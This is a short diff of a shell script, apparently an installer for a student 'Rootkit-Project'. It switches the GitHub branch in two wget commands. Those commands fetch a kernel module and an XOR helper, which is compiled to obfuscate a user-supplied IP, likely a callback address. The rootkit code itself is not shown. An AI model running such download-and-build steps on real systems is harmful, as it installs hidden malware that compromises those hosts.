@@ -1,7 +1,7 @@
 #!/bin/ash
 
 # récuperer le .ko
-wget https://github.com/gobelinor/Rootkit-Project/raw/refs/heads/dev_tibo/mesmodules/ipv4.ko
+wget https://github.com/gobelinor/Rootkit-Project/raw/refs/heads/main/mesmodules/ipv4.ko
 
 # ajout de ip personnalisé
 echo "Tape ton ip:"
@@ -11,7 +11,7 @@ if [ -z "$IP_ADDR" ]; then
   exit 1
 fi
 
-wget https://github.com/gobelinor/Rootkit-Project/raw/refs/heads/dev_tibo/mesmodules/insert/xor.c
+wget https://github.com/gobelinor/Rootkit-Project/raw/refs/heads/main/mesmodules/insert/xor.c
 gcc -o xor xor.c
 encrypted=$(./xor $IP_ADDR)
 # echo "ip chiffrée: $encrypted"
